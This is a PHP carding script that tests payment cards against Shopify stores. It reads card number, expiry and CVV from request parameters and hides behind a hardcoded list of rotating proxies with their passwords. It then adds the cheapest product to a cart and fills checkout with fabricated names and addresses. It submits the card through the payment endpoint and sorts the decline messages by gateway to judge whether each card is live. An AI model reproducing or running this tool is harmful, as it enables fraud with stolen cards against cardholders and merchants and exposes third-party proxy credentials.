<?php

include('coki.php');
include('coki1.php');
include('hosting.php');

error_reporting(0);

$retry = 0;
if($retry == 4){
$status1 = "Waos! ⛈";
$status12 = "Max Retry!";
}
else{
$status12 = "Site Coded!";
}

function get_random_string($length) {
// Genera una cadena de texto aleatoria.
$letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
$result_str = '';
for ($i = 0; $i < $length; $i++) {
$result_str .= $letters[rand(0, strlen($letters) - 1)];
}
return $result_str;
}

function capture($str, $start, $end){	
	return strpos($str, $start) === false || strpos($str, $end) === false
? NULL : explode($end, explode($start, $str)[1])[0];
}

function capturestr($string, $capstr)
{
$arrall = [];
foreach ($capstr as $capstring) {
preg_match_all("/$capstring[0](.*?)$capstring[1]/", $string, $cap);
array_push($arrall, $cap[1]);
}
return $arrall;
}

function capturehtml($str, $starting_word, $ending_word){
$subtring_start  = strpos($str, $starting_word);
$subtring_start += strlen($starting_word); 
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
return substr($str, $subtring_start, $size);
 }

//proxys prox
$ip12 = array(
"5.105.97.41:61234:isp2346:TFugO",
"5.105.120.154:61234:isp2203:kdePS",
"89.116.233.174:61234:isp4527:cQCHI",
"89.116.233.134:61234:isp4487:fzPFc",
"89.116.99.198:61234:isp1991:QFGOZ",
"88.216.39.72:61234:isp1353:dtBAx",
"5.105.120.12:61234:isp2061:txdqK",
"91.193.255.138:61234:isp3467:Oixjm",
"89.116.113.113:61234:isp3186:YyWTn",
"89.116.233.183:61234:isp4536:ATtzR"
);
$socks12 = array_rand($ip12);
$proxys12 = $ip12[$socks12];

$proxy_parts = explode(':', $proxys12); // dividir la cadena del proxy en partes
$ip_address = $proxy_parts[0]; // la primera parte es la dirección IP
$puerto = $proxy_parts[1];
$username = $proxy_parts[2]; // la tercera parte es el usuario
$password = $proxy_parts[3]; // la cuarta parte es la contraseña
$proxypro = "$ip_address:$puerto";
$up3 = "$username:$password";

$rnd_ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36";
/*=====  Cc  ======*/
$cc = $_GET["cc"];
$month = $_GET["month"];
$year = $_GET["year"];
$cvv = $_GET["cvv"];
/*=====  sub_month  ======*/
$yearcont=strlen($year);
if ($yearcont<=2){
$year = "20$year";
}
if($month == "01"){
$sub_month = "1";
}elseif($month == "02"){
$sub_month = "2";
}elseif($month == "03"){
$sub_month = "3";
}elseif($month == "04"){
$sub_month = "4";
}elseif($month == "05"){
$sub_month = "5";
}elseif($month == "06"){
$sub_month = "6";
}elseif($month == "07"){
$sub_month = "7";
}elseif($month == "08"){
$sub_month = "8";
}elseif($month == "09"){
$sub_month = "9";
}elseif($month == "10"){
$sub_month = "10";
}elseif($month == "11"){
$sub_month = "11";
}elseif($month == "12"){
$sub_month = "12";
}
/*=====  Gate  ======*/
$num = rand(1000, 999999);
$coki = uniqid($num);

/*=====  site  ======*/
$site1 = $_GET["site"];
$site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
$site = "$site2/products.json";
$url = explode("/", $site)[2];
/*=====  1REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, $site);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: '.$url.'',
'user-agent: '.$rnd_ua.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'cookie'.$coki.'.txt');
$r1 = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
if($http_code == 430){
$status1 = "Error ⚠️";
$status12 = "cambia de ip!";
}
$variants = capturestr($r1, [['"variants":\[{"id":', ',"']]);
$prices = capturestr($r1, [['"price":"','"']]);
$disponible = capturestr($r1, [['"available":',',']]);

$first_min_price = null;
$first_min_index = null;
for ($i = 0; $i < count($prices[0]); $i++) {
if ($prices[0][$i] > 0 && ($first_min_price === null || $prices[0][$i] < $first_min_price)) {
$first_min_price = $prices[0][$i];
$first_min_index = $i;
}
}

$first_min_price_position = null;
if ($first_min_price === 0.00) {
$first_min_price_position = array_search(0.00, $prices[0]);
}

$cartid_first = "".$variants[0][max($first_min_index - 1, 0)]."";
$available_first = "".$disponible[0][max($first_min_index - 1, 0)]."";

$last_min_price = null;
$last_min_index = null;
for ($i = count($prices[0]) - 1; $i >= 0; $i--) {
if ($prices[0][$i] > 0 && ($last_min_price === null || $prices[0][$i] < $last_min_price)) {
$last_min_price = $prices[0][$i];
$last_min_index = $i;
}
}

$cartid_last = "".$variants[0][substr($last_min_index, 0, 2)]."";
$available_last = "".$disponible[0][$last_min_index]."";

$cartid11 = $cartid_first;

cart:
$cart = "https://$url/cart/add.js";
/*=====  2REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, $cart);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.'',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'id='.$cartid_first.'&quantity=1');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'cookie'.$coki.'.txt');
$r2 = curl_exec($ch);
$http_code22 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
if($http_code22 == 400){
$cartid11 = $cartid_last;
$retry++;
goto cart;
}
if(strpos($r2, '/cart')){
$cart = "https://$url/cart/add";
$retry++;
goto cart;
}

/*=====  3REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$url/checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'cookie'.$coki.'.txt');
$r3 = curl_exec($ch);
//$checkout1 = capturehtml($r3, 'Location: ','X');
$checkout1 = capturehtml($r3, 'location: ','
x-sorting-hat-podid:');
//$checkout1 = capturehtml($r3, 'location: ','\r\nx-sorting-hat-podid:');
// Obtener el path de la URL
$path = parse_url($checkout1, PHP_URL_PATH);

// Obtener los valores que quieres capturar del path
$checkout_id = explode('/', $path)[2];
$token = explode('/', $path)[3];

// Concatenar los valores en una nueva URL
$checkout2 = ''.$url.'' . $path;
$checkout = rtrim($checkout2, '_');

$atv = get_random_string(86);

$mail1 = file_get_contents("$hosting/rnd/rnd.php?nat=Us");
$mail = capture($mail1, '"email":"','"');
$name = capture($mail1, '"first":"','"');
$last = capture($mail1, '"last":"','"');

if(strpos($url, '.au')){
$nat = "AU";
$city = "Hambidge";
$street = "56 Bayview Road";
$state = "South Australia";
$state = "South Australia";
$zip = "5642";
$country = "Australia";
}
else{
$a = file_get_contents("$hosting/auto/site.php?site=https://$url");
$nat = capture($a, '"nat":"','"');
if($nat == "US"){
$city = "New York";
$street = "118 W 132nd St";
$state = "New York";
$zip = "10027";
$country = "United States";
}
else{
$city = capture($a, '"city":"','"');
$street = capture($a, '"street":"','"');
$country = capture($a, '"country":"','"');
$zip = capture($a, '"zip":"','"');
$state = capture($a, '"state":"','"');
$state1 = capture($a, '"state1":"','"');
}
}
/*=====  4REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($atv).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($mail).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bpick_up_in_store%5D%5Bselected%5D=false&checkout%5Bid%5D=delivery-shipping&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$name.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$last.'&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D='.$street.'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.$city.'&checkout%5Bshipping_address%5D%5Bcountry%5D='.$country.'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$state.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D=9006371822&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=974&checkout%5Bclient_details%5D%5Bbrowser_height%5D=819&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r4 = curl_exec($ch);
$http_code1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);

aaa:
/*=====  44REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$atv.'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($mail).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$name.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$last.'&checkout%5Bshipping_address%5D%5Bcompany%5D='.$last.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.$street.'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.$city.'&checkout%5Bshipping_address%5D%5Bcountry%5D='.$nat.'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$state.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D=19006318646&checkout%5Bshipping_address%5D%5Bcountry%5D='.$country.'&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$name.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$last.'&checkout%5Bshipping_address%5D%5Bcompany%5D='.$last.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.$street.'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.$city.'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$state.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D=19006318646&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=669&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r44 = curl_exec($ch);
$http_code11 = curl_getinfo($ch, CURLINFO_HTTP_CODE);

/*=====  5REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout?previous_step=contact_information&step=shipping_method");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r5 = curl_exec($ch);
$data = capture($r5, 'data-checkout-subtotal-price-target="','"');

sleep(5);
/*=====  6REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout/shipping_rates?step=shipping_method");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r6 = curl_exec($ch);
$shipping1 = capture($r6, 'data-shipping-method="', '"');
$shipping = urldecode($shipping1);
$pay = capture($r6, '[data-select-gateway=',']');
if(empty($shipping1)){
$retry++;
goto aaa;
}

/*=====  7REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($atv).'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D='.urlencode($shipping1).'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=974&checkout%5Bclient_details%5D%5Bbrowser_height%5D=819&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r7 = curl_exec($ch);

/*=====  8REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout?previous_step=shipping_method&step=payment_method");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r8 = curl_exec($ch);

/*=====  9REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout?step=payment_method");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r9 = curl_exec($ch);
$pay = capture($r9, 'data-select-gateway="','"');
$total = capture($r9, 'data-checkout-payment-due-target="','"');

/*=====  10REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://deposit.us.shopifycs.com/sessions");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: deposit.us.shopifycs.com',
'Connection: keep-alive',
'Accept: application/json',
'Content-Type: application/json',
'User-Agent: '.$rnd_ua.'',
'Accept-Language: es-US,es;q=0.6',
'Origin: https://checkout.shopifycs.com',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://checkout.shopifycs.com/'
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","name":"'.$name.' '.$last.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'"},"payment_session_scope":"'.$url.'"}');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r10 = curl_exec($ch);
$id = trim(strip_tags(capture($r10, '"id":"','"')));

/*=====  11REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($atv).'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D='.$pay.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=9006372828&checkout%5Btotal_price%5D='.$total.'&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=974&checkout%5Bclient_details%5D%5Bbrowser_height%5D=819&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r11 = curl_exec($ch);
sleep(5);
/*=====  12REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout/processing");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r12 = curl_exec($ch);

/*=====  13REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout?validate=true");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r13 = curl_exec($ch);

sleep(5);
/*=====  14REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$checkout?from_processing_page=1&validate=true");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r14 = curl_exec($ch);
$msg2 = trim(strip_tags(capture($r14, '<p class="notice__text">','</p></div></div>')));
$total1 = capture($r14, 'data-checkout-payment-due-target="','">');
$total_price = capture($r9, 'data-checkout-payment-due-target="'.$total.'">','</span>');
$time1 = substr(curl_getinfo($ch)['total_time'], 0, 4) . "'s";
$time1_numeric = intval(str_replace("'", "", $time1));
$time = $time1_numeric + 15 . "'s";

$card = "$cc|$sub_month|$year|$cvv";

if($msg2 == "2010 Card Issuer Declined CVV" || $msg2 == "2047 Call Issuer. Pick Up Card." || $msg2 == "2007 No Account" || $msg2 == "2044 Declined - Call Issuer" || $msg2 == "2038 Processor Declined" || $msg2 == "2014 Processor Declined - Fraud Suspected" || $msg2 == "2000 Do Not Honor" || $msg2 == "2001 Insufficient Funds" || $msg2 == "2015 Transaction Not Allowed" || $msg2 == "2019 Invalid Transaction" || $msg2 == "2106 Cannot Authorize at this time (Policy)" || $msg2 == "Transaction declined - gateway rejected" || strpos($msg2, 'Cannot')){
$type = "Shopify + Braintree";
}
elseif($msg2 == "CVV does not match"){
$type = "Shopify + Spreedly";
}
elseif($msg2 == "Security codes does not match" || $msg2 == "AVS result is declined by user" || $msg2 == "Exc App Amt Lmt" || $msg2 == "Insuff Funds" || $msg2 == "02 Try later" || $msg2 == "No Such Issuer" || $msg2 == "CVV2 Mismatch" || $msg2 == "03 Do not retry" || $msg2 == "AVS REJECTED"){
$type = "Shopify Mix";
}
elseif($msg2 == "CVD ERROR                       99048" || $msg2 == "AUTH DECLINED                   09001" || $msg2 == "*REQUEST DENIED*                99019" || $msg2 == "INVALID CARD NO                 99005" || $msg2 == "Declined use updated card" || $msg2 == "Card declined do not retry" || $msg2 == "Information Details" || $msg2 == "Declined refer call to issue" || $msg2 == "LOST/STOLEN CARD                99016" || $msg2 == "HOLD - CALL                     99003" || (strpos($msg2, 'AUTH'))){
$type = "Shopify + Moneris";
}
elseif($msg2 == "Transaction Normal - Invalid CC Number" || $msg2 == "Transaction Normal - Insufficient Funds" || $msg2 == "Address not Verified - Insufficient Funds" || $msg2 == "Transaction Normal - Suspected Fraud" || $msg2 == "Address not Verified - Suspected Fraud" || $msg2 == "Address not Verified - Restraint" || $msg2 == "Address not Verified - Pickup" || $msg2 == "Transaction Normal - Over Limit Frequency" || $msg2 == "Address not Verified - Declined" || $msg2 == "Transaction Normal - Pickup" || $msg2 == "Transaction Normal - Lost/Stolen" || $msg2 == "Transaction Normal - Over the limit" || $msg2 == "Address not Verified - No Account" || $msg2 == "Transaction Normal - Invalid Transaction" || $msg2 == "Transaction Normal - Unauthorized User" || $msg2 == "Transaction Normal - Account Closed" || $msg2 == "Transaction Normal - Declined"){
$type = "Shopify + Payeezy";
}
elseif($msg2 == "CVV2 Mismatch" || $msg2 == "Invalid expiration date: 10502-This transaction cannot be processed. Please use a valid credit card." || $msg2 == "Declined: 10541-Please use a different payment card." || $msg2 == "Declined: 15005-This transaction cannot be processed" || $msg2 == "Invalid account number: 10535-This transaction cannot be processed. Please enter a valid credit card number and type." || $msg2 == "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number." || $msg2 == "Invalid account number: 10535-This transaction cannot be processed. Please enter a valid credit card number and type." || $msg2 == "Declined: 15005-This transaction cannot be processed." || $msg2 == "Field format error: 12002-This transaction cannot be processed due to either missing, incomplete or invalid 3-D Secure authentication values." || $msg2 == "Declined: 10541-Please use a different payment card."){
$type = "Shopify + Payflow";
}
elseif($msg2 == "CVC Declined" || $msg2 == "Issuer Suspected Fraud | 59 : Suspected fraud" || $msg2 == "Refused" || $msg2 == "FRAUD"){
$type = "Shopify + Adyen";
}
elseif($msg2 == "This transaction has been declined" || $msg2 == "Street address and postal code do not match." || $msg2 == "No Match"){
$type = "Shopify Avs";
}
